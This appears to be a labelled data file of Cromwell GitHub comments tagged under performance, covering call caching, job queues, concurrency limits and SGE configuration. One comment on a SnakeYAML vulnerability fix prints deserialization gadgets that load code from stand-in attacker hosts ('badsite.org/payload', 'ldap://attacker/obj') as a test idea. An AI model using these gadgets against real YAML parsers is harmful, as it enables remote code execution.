Performance,"; }. task CallModeledSegments {; String entity_id; File modeled_segments_input_file; Boolean? load_copy_ratio; Boolean? load_allele_fraction; File? output_dir; String? output_prefix; Float? normal_minor_allele_fraction_threshold; Float? copy_ratio_peak_min_weight; Float? min_fraction_of_points_in_normal_allele_fraction_region; File? gatk4_jar_override. # Runtime parameters; String gatk_docker; Int? mem_gb; Int? disk_space_gb; Boolean use_ssd = false; Int? cpu; Int? preemptible_attempts. Int machine_mem_mb = select_first([mem_gb, 7]) * 1000; Int command_mem_mb = machine_mem_mb - 1000. String output_dir_ = select_first([output_dir, ""out/""]); String output_prefix_ = select_first([output_prefix, entity_id]). command <<<; set -e; mkdir ${output_dir_}; export GATK_LOCAL_JAR=${default=""/root/gatk.jar"" gatk4_jar_override}. gatk --java-options ""-Xmx${command_mem_mb}m"" CallModeledSegments \; --input ${modeled_segments_input_file} \; --load-copy-ratio ${default=""true"" load_copy_ratio} \; --load-allele-fraction ${default=""true"" load_allele_fraction} \; --output ${output_dir_} \; --output-prefix ${output_prefix_} \; --normal-minor-allele-fraction-threshold ${default=""0.475"" normal_minor_allele_fraction_threshold} \; --copy-ratio-peak-min-weight ${default=""0.03"" copy_ratio_peak_min_weight} \; --min-fraction-of-points-in-normal-allele-fraction-region ${default=""0.15"" min_fraction_of_points_in_normal_allele_fraction_region}; >>>. runtime {; docker: ""${gatk_docker}""; memory: machine_mem_mb + "" MB""; disks: ""local-disk "" + disk_space_gb + if use_ssd then "" SSD"" else "" HDD""; cpu: select_first([cpu, 1]); preemptible: select_first([preemptible_attempts, 5]); }. output {; File called_modeled_segments_data = ""${output_dir_}${output_prefix_}.called.seg""; }; }. task PlotDenoisedCopyRatios {; String entity_id; File standardized_copy_ratios; File denoised_copy_ratios; File ref_fasta_dict; Int? minimum_contig_length; String? output_dir; File? gatk4_jar_override. # Runtime parameters; String gatk",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3618#issuecomment-388871669:27740,load,load-copy-ratio,27740,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3618#issuecomment-388871669,2,['load'],"['load-allele-fraction', 'load-copy-ratio']"
Performance,"> * cromwell v27; > * SGE backend; > * server mode; > ; > Cromwell timing diagram displays SGE queued (qw) status as Running. This increases difficulty of debugging (or evaluating) a tool, since we do not have a reliable and easy(!) way to look at timing. @LeeTL1220 hi，Have you solved this problem ？",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2464#issuecomment-732694657:95,queue,queued,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2464#issuecomment-732694657,1,['queue'],['queued']
Performance,"> 1. It looks like the perf tests were run on version `""cromwellVersion"": ""48-e0cee74-SNAP"",`, but I don't see that hash in the commit history here.; > ; > I just want to check that was the version you were expecting them to run against, since I would expect it to be a `49-...` hash (you presumably had to rebase onto develop to undo all of the not-quite-summarizer-fix changes)?. @cjllanwarne this is the proper version. I actually took your initial `cjl_summarization_queue` branch and made updates in it. Then I built it locally and pushed to my personal Dockerhub.; I only merged develop branch into this one before creating the PR. >I think we could make this process more efficient by only writing the IDs into the summary queue in the first place if we know we'll actually want to summarize them later on. Do you mean write only those IDs which have certain metadata key value? I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584879436:730,queue,queue,730,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584879436,2,"['perform', 'queue']","['performance', 'queue']"
Performance,"> ; `tee` will cache the standard output of the program into a buffer, after using `sync`, it will brush the data from the buffer to disk, after that, nfs will synchronize to the remote service (nfs itself has a delay of a few seconds); so no matter whether it is `tee` and `sync`, or nfs there may be a problem, the best thing is to turn the`rc.tmp` to` rc` file operation to give a delay of a few seconds is to do it in the case of not changing the source code. It's a good idea to delay the `rc.tmp` to `rc` file operation for a few seconds without changing the source code.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1710994350:15,cache,cache,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1710994350,1,['cache'],['cache']
Performance,"> > I have the same problem. Have you solved it?; > ; > I think it might be a bogus warning? My container seems to run correctly. Since I was using a Singularity image file, I couldn't get a Docker-hash, which resulted in call-cache not working. This is the key issue. Isn't the main reason we use server mode for call-cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504:227,cache,cache,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504,2,['cache'],['cache']
Performance,"> > I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria.; > ; > But sooner or later we have to do that anyway on the summarization side (and probably on the order of 99% of metadata doesn't need summarizing). By doing it before we write to the DB, I think we could avoid:; > ; > 1. Writing the entries we know don't need to be summarized to the summarization queue.; > 2. Reading the non-summarizable metadata _value_s from the database into Cromwell (and some of them are pretty big) - only to discard them when we read the key and discover it's not summarizable. I'm still reluctant to do that:; 1. Yes, but writing a single additional number per entry to a summary table is not nearly a huge overhead, taking into attention that, as you said, in the same transaction we are writing some huge metadata entries into the `metadata_entry` table.; 2. Summarizer works asynchronously and though I agree that we should keep it's performance good enough, moving metadata key filtering logic to the ""write-metadata-entry"" side of things may affect performance of running workflows.; > Reading the non-summarizable metadata _value_s from the database into Cromwell. Also, if my understanding is correct, this is how summarizer works right now. There are other possible things which we can do to optimize summarizer performance, one of which would be to add additional `metadata_key` column to our new queue table, and then allow summarizer to decide if it wants to fetch data from `metadata_entry` table based on that key. But this is food for thought for future optimizations.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-585322534:55,perform,performance,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-585322534,8,"['optimiz', 'perform', 'queue']","['optimizations', 'optimize', 'performance', 'queue']"
Performance,> Bunting on review because it looks like we are adding the test in #5408. Not the type of bird usually drawn to my PRs but I'll take it ![indigo bunting](https://pittsburghquarterly.com/media/k2/items/cache/ff0158c2594917cd6a9c4e297e8a8d7c_XL.jpg),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5406#issuecomment-584766720:202,cache,cache,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5406#issuecomment-584766720,1,['cache'],['cache']
Performance,"> Do we have a lot of users with UGER, external and internal?. I can only speak for internal: More and more ""Broad"" users are using Grid Engine, especially [UGER](https://intranet.broadinstitute.org/bits/service-catalog/compute-resources/high-performance-computing-uger), but not with cromwell, yet. DSP-methods have been big users of Grid Engine over the past few years, but mostly the older Sun Grid Engine, and with GATK-Queue. Meanwhile BITS is trying to get them to move over to a Univa Grid Engine installation BITS has called UGER. Unlike the older unlimited setup, UGER's setup has hard limits on the number of concurrent jobs that can be tracked by the Grid Engine scheduler, previously 100, now 1000. With the relaxing of the limit, plus the cromwell's `concurrent-job-limit` feature, this ticket a lower priority imho. Still, it ""would be nice"" if just like we submit in batches to JES, we also submitted in batches to other systems that support it including GridEngine/SLURM/PBS/etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-332393984:243,perform,performance-computing-uger,243,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-332393984,4,"['Queue', 'concurren', 'perform']","['Queue', 'concurrent', 'concurrent-job-limit', 'performance-computing-uger']"
Performance,"> Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?. I have been exercising this condition fairly regularly over the last few days while pushing changes and it doesn't seem to cause any problems. The build takes a consistent 6 minutes; if I push 3 changes at 1 minute increments, the builds run on parallel nodes and finish in the order they started.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043:24,concurren,concurrency,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043,2,"['concurren', 'race condition']","['concurrency', 'race conditions']"
Performance,"> Hey @kevin-furant, we had success getting it working. Are you seeing any weird logs? Is your Cromwell instance correctly resolving the docker digest (so it's requesting an image like ""imageName@sha256:ad21[...]"")?. We cannot use Docker on our cluster, I use a Singularity image file; ` SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; concurrent-job-limit = 300. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. exit-code-timeout-seconds = 120. runtime-attributes = """"""; Int cpu = 1; Float memory_gb = 1; String? docker_mount; String? docker; String? sge_queue = ""bc_b2c_rd.q,b2c_rd_s1.q""; String? sge_project = ""P18Z15000N0143""; """""". runtime-attributes-for-caching {; # singularity_image: true; }. submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb + ""g""} \; ${""-l p="" + cpu } \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; """""". submit-docker = """"""; IMAGE=/zfsyt1/B2C_RD_P2/USER/fuxiangke/wgs_server_mode_0124/${docker}.sif; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb + ""g""} \; ${""-l p="" + cpu } \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; singularity exec --containall --bind ${docker_mount}:${docker_mount} --bind ${cwd}:${cwd} --bind ${cwd}:${docker_cwd} $IMAGE /bin/bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; `; ` runtime {; docker: ""qc_align""; docker_mount: ""/zfsyt1/B2C_RD_P2/USER/fuxiangke/wgs_server_mode_0124""; cpu: cpu; memory: ""~{mem}GB"" ; };",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370680:415,concurren,concurrent,415,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370680,2,['concurren'],"['concurrent', 'concurrent-job-limit']"
Performance,"> Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark; > […](#); > On Sat, Oct 24, 2020 at 5:27 AM Luyu ***@***.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA> . Hi Mark,. Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260951333e638/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L435 . The `SCRIPT_EPILOGUE` has a default value `sy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694:870,concurren,concurrently,870,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694,1,['concurren'],['concurrently']
Performance,"> However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?. I am not part of the cromwell team, so it is not up to me whether this gets merged or not. However, allowing softlinks in containers will give errors for a lot of people who are not aware of the implementation details. Those people *will* post bug reports on the cromwell bug tracker. If this were to work, I guess the best way is to allow a config override ""allow-softlinking-in-containers"" with a huge warning in the documentation. That way the unaware will not get caught by surprise as active action needs to be taken to run into this error. > Reducing the number of threads would also reduce the task throughput and limit performance. Offtopic: This is not necessarily always the case. Cromwell uses a very large number of threads by default if the server has a lot of cores. Even with the soft-linking strategy I would recommend playing with that setting a little. More threads is not necessarily better. Task and context switching are expensive operations too, not too mention the ability of the filesystem to handle multiple requests at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957:792,throughput,throughput,792,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957,2,"['perform', 'throughput']","['performance', 'throughput']"
Performance,"> I believe the next steps for this PR and its sibling are being discussed outside of GitHub. Somewhat. We have a thread open with Kyle on high-level details of performance, complexity, and support. I'd still appreciate a review on the code submitted so far. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-895441231:161,perform,performance,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-895441231,1,['perform'],['performance']
Performance,"> I recommend using the call cache diff endpoint; > ; > ```; > GET ​/api​/workflows​/v1/callcaching​/diff; > ```; > ; > > This endpoint returns the hash differences between 2 completed (successfully or not) calls. Thank you, i will try it",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823727881:29,cache,cache,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823727881,1,['cache'],['cache']
Performance,"> I sometimes seem to be getting timeouts on smaller databases (300 seconds for a 2GB file), I think this might be due to Cromwell terminating incorrectly and it not starting up again. If the database is on NFS it might not be cached locally. And with a 100mbit connection it might happen. But this is just speculation. Anyway, I hope my PR on liquibase gets merged soon so I can continue working on the problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-629968131:227,cache,cached,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-629968131,1,['cache'],['cached']
Performance,"> I'm not inclined to add a glob test as I don't think it's really adding any value. The value which I think it would add is guaranteeing that the aliased task directories really are distinct. Eg this particular test case would pass if the tasks were ran in serial (cf. our ""concurrent job start limit"" option for AWS tests)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4840#issuecomment-484259156:275,concurren,concurrent,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4840#issuecomment-484259156,1,['concurren'],['concurrent']
Performance,"> I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria. But sooner or later we have to do that anyway on the summarization side (and probably on the order of 99% of metadata doesn't need summarizing). By doing it before we write to the DB, I think we could avoid:. 1. Writing the entries we know don't need to be summarized to the summarization queue.; 2. Reading the non-summarizable metadata _value_s from the database into Cromwell (and some of them are pretty big) - only to discard them when we read the key and discover it's not summarizable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584890956:53,perform,performance,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584890956,2,"['perform', 'queue']","['performance', 'queue']"
Performance,"> I'm wondering - what would be the return code for the second worker that cannot create the lock? What in the above says ""Try to make the lock, if it doesn't work, come back and try again (and do this until the container is available.). This is the default behaviour of `flock`, I believe. My flock man page says: ""By default, if the lock cannot be immediately acquired, flock waits until the lock is available."". > Overall I think this is a really important thing to think about - aside from cluster resources, if you are pulling an image from a remote registry, that might have negative consequences for the registry. My understanding of Singularity was that the actual *pulling* would be cached using the Singularity cache, and only the *building* would be duplicated. Is this not right? In any case, this will avoid smashing the Singularity cache at least. > I also wouldn't be sparse with the variables, for some future user coming to read this, I would use --exclusive instead of -x and then --unlock instead of -u so it's explicitly clear. Agreed! I'll edit the OP.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509639973:692,cache,cached,692,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509639973,3,['cache'],"['cache', 'cached']"
Performance,"> It looks like upgrading from `Constructor` to `SafeConstructor` does not make much difference. I wonder if it is due to Scala not having a `javax.script.ScriptEngineManager` or other difference in class loading?. Previously we (cwlviewer) were using a plain `Yaml()` object which defaults to the `Constructor`: https://bitbucket.org/asomov/snakeyaml/src/5e41c378e49c9b363055ac8b0386b69cb3f389d2/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-66 and this led to the vulnerability. Perhaps you can construct a Scala proof of concept (and therefore test) by serializing the Scala equivalent of ; ``` java; URL[] urls = new URL[1];; urls[0] = new URL(""https://www.badsite.org/payload"");; ScriptEngineManager foo = new ScriptEngineManager(new java.net.URLClassLoader(urls));; yaml.dump(foo);; ```. https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf suggests the following yaml to try as well:; ``` yaml; !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; autoCommit: true; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331:205,load,loading,205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331,1,['load'],['loading']
Performance,> Just curious if putting a sleep [here](https://github.com/broadinstitute/cromwell/blob/2d8ff3b0962bbe84828445fd3ac77d2379e499c2/supportedBackends/aws/src/main/scala/cromwell/backend/impl/aws/AwsBatchAsyncBackendJobExecutionActor.scala#L341) or [here](https://github.com/broadinstitute/cromwell/blob/2d8ff3b0962bbe84828445fd3ac77d2379e499c2/supportedBackends/aws/src/main/scala/cromwell/backend/impl/aws/AwsBatchJob.scala#L198) are viable solutions until something more generic in the core of Cromwell can be implemented. Any update and interim solution available? I am curious if there is an alternative like python aiohttp concurrent requests number limit rather than sleep.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-440734911:626,concurren,concurrent,626,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-440734911,1,['concurren'],['concurrent']
Performance,"> My understanding of Singularity was that the actual pulling would be cached using the Singularity cache, and only the building would be duplicated. Is this not right? In any case, this will avoid smashing the Singularity cache at least. I think that if it's the case that the (finished image) isn't in the cache, all of the workers would start building (and then not copy to the final thing given that another worker got there first). It's been a while, so it might be good to check with others on slack.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509643616:71,cache,cached,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509643616,4,['cache'],"['cache', 'cached']"
Performance,"> Nice! I really appreciate the attention to how we're handling this large amount of data.; > ; > How are you thinking clients will interact with this service?. For now, I'm just thinking that clients will get a reference to this actor and call `getSku` repeatedly, as needed. Still a little up in the air as these clients don't yet exist. . Should perform fine with only the public cost catalog, since we're limited to one batch of requests every 24 hours. IMO fancier async stuff is good but should come later.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7507#issuecomment-2307714053:349,perform,perform,349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7507#issuecomment-2307714053,1,['perform'],['perform']
Performance,"> One thing you can try is setting `concurrent-job-limit` to 2 or similar so that only a small, fixed number of jobs launch simultaneously. That does work with the local Docker backend because it's a universal Cromwell property, independent of backends.; > ; > #1841. that is something that I can do indeed, but If I have, let say one havy task and on easy task and I want to launch nor more than one havy task at a time and as many as needed easy tasks, `concurrent-job-limit` will not help unfortunatly. Every task, both easy and havy will be computed one by one, without possible parallelisation. So it is really subotimal.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1032794448:36,concurren,concurrent-job-limit,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1032794448,2,['concurren'],['concurrent-job-limit']
Performance,"> So a docker_pull command would have to be executed at task execution time. But then it is redundant. This command can be part of the submit script. I looked into this a while ago so I might be wrong, but I think a `docker_pull` hook would still be useful, even at runtime, because it would be run only once, and *not* scattered, unlike the actual `submit_docker` hook. This would give it time to pull/convert the container without any race condition issues, meaning we don't have to use `flock` or any of that messy bash. The execution graph would look like:; ```; pull_docker; ⭩ ↓ ⭨; submit submit submit; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627386598:437,race condition,race condition,437,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627386598,1,['race condition'],['race condition']
Performance,"> Sounds good, except maybe the per-batch timing should include lookup, even if the per workflow should exclude?. Yeah good point. I noticed on Alpha that the lookup portion was only taking 20 milliseconds with the optimized SQL, so I kind of forgot about it on account of insignificance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6347#issuecomment-841343968:215,optimiz,optimized,215,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6347#issuecomment-841343968,1,['optimiz'],['optimized']
Performance,"> There is one I'm having trouble googling a fix for. I can't figure out how to shut off PostgreSQL exceptions printing possibly sensitive row contents via their messages. I wouldn't be surprised if this is baked into the JDBC layer. We could try something like this:; ```; diff --git a/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala b/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala; index 5d28cf1..5b0e227 100644; --- a/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala; +++ b/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala; @@ -11,6 +11,7 @@ import net.ceedubs.ficus.Ficus._; import org.slf4j.LoggerFactory; import slick.basic.DatabaseConfig; import slick.jdbc.{JdbcCapabilities, JdbcProfile, TransactionIsolation}; +import org.postgresql.util.{PSQLException, ServerErrorMessage}. import scala.concurrent.duration._; import scala.concurrent.{Await, ExecutionContext, Future}; @@ -199,6 +200,8 @@ abstract class SlickDatabase(override val originalDatabaseConfig: Config) extend; case _ => /* keep going */; }; throw rollbackException; + case pe: PSQLException =>; + throw new PSQLException(new ServerErrorMessage(s""Oh no, a postgres error occurred! ${pe.getMessage}"")); }; }(actionExecutionContext); }; ```; only with some on-the-fly modification of the error message instead of my dummy string. This compiles for me, but I'm not sure how to test it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-504487606:893,concurren,concurrent,893,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-504487606,2,['concurren'],['concurrent']
Performance,"> There's quite a bit of debate internally about this PR. Some team members remain deeply uncomfortable with how locking is handled, but it would take us a lot of time to research and recommend a better solution. If I may reiterate: by default this does not break anything for anyone. The locking only happens when `cached-copy` is set in the config consciously by the user. I maintain [my own patched jar for cromwell](https://github.com/rhpvorderman/cromwell/releases/tag/41-LUMC-patches), because this is taking very long already. We are running this in production and not experiencing problems. (There are only problems when the maximum number of hardlinks is reached, then cromwell defaults to copying again. It does not break anything, but it will use a lot of space on the filesystem and it will slowdown pipeline runs. I am working on a fix for that as well.)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-504046142:316,cache,cached-copy,316,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-504046142,1,['cache'],['cached-copy']
Performance,"> This fixes the problem at the point of expression evaluation... it seems like it might be easier (and a lot less fiddly?) to do the relative file resolution much earlier, at the point that inputs are being read in to the workflow in the first place. > The ValidatedWomNamespace produced as part of workflow materialization contains a womValueInputs field... I wonder whether performing this mapping as part of creating that validated set of inputs would work?. Great suggestion. I will take a look at this. I can checkout the test case on a new branch and try to hack there. One of the catches will be that this resolving will be backend dependent. In the current situation the input expressions are evaluated first, and after that the inputs are resolved. (This makes sense because input can also be something like `baseDir + ""/my_file.txt""`, which needs to be evaluated). But indeed this could be bypassed by doing this already at the workflow level, before it gets passed down to the task level. I will take a look at this. If it does not work, (or work easily) then I will report back here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618838024:377,perform,performing,377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618838024,1,['perform'],['performing']
Performance,"> This is a common configuration that prohibits docker. ""Local"" and SGE/HPC are two separate issues. SGE (and all HPC) backends can already run without docker. When setting up the backend, just don't add a `submit-docker` config variable nor a `docker` runtime attribute to the backend's configuration. Docs for new local/HPC backends are documented under the title ""[SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/)"". Separately, there is the issue that cromwell is pre-loaded with a default ""Local"" backend. This ""Local"" backend [is docker enabled](https://github.com/broadinstitute/cromwell/blob/a3c5e055a5a4c6793a526689d38577c2f122bc95/core/src/main/resources/reference_local_provider_config.inc.conf#L9-L34). The simplest workaround today is to create another backend ""Local-NoDocker"" or similar. Or if one wants to just change the existing ""Local"" backend they can use a config like:. ```hocon; include required(classpath(""application"")); backend.providers.Local.config.runtime-attributes=""""; backend.providers.Local.config.submit-docker=null; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-423240258:484,load,loaded,484,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-423240258,1,['load'],['loaded']
Performance,"> This is unusual, I have successfully call cached files of 1 TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:44,cache,cached,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,3,['cache'],['cached']
Performance,> We'll need 5GB (no joke!) . Hmm it doesn't seem like a good idea to load a 5GB file over network in Cromwell's memory 😄,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2768#issuecomment-338301969:70,load,load,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2768#issuecomment-338301969,1,['load'],['load']
